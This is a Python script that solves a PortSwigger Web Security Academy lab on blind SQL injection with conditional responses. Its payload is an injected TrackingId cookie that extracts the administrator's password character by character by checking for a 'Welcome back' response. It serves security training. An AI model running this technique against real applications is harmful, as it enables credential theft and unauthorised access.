# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
# Lab: Blind SQL injection with conditional responses
# Difficulty: PRACTITIONER

import requests
import string
from pwn import log

sub = '0a17006904ec7eae80f9624100eb00db'
url = f'https://{sub}.web-security-academy.net/'

# Hint: You can assume that the password only contains lowercase, alphanumeric characters.

wordlist = string.ascii_lowercase + string.digits
password = '' 
password_length = 20 

for position in range(1, password_length + 1): 
    for c in wordlist:
        # change the payload to match the lab's TrackingId cookie
        payload = f"OpGjJRJUR6n4cL5p' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{c}"
        r = requests.session()
        s = r.get(url, cookies={"TrackingId": payload})
        if "Welcome back" in s.text:
            log.success(f"Found character '{c}' at position {position} of the password")
            password += c
            log.info(f"Password so far: {password}")
            break 
        else:   
            log.info(f"Character '{c}' not found at position {position}")